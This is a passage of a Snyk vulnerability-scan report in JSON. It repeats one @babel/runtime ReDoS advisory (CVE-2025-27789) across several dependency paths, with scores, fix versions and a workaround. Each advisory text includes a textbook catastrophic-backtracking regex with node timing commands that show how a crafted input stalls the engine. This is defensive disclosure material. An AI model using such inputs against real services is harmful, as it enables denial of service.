            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "package.json@0.1.0",
          "@mui/material@5.13.2",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@mui/material@5.13.2",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "package.json@0.1.0",
          "@mui/styles@5.13.2",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@mui/styles@5.18.0",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "package.json@0.1.0",
          "history@4.10.1",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "history@4.10.1",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "package.json@0.1.0",
          "jss@10.0.3",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "jss@10.0.3",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
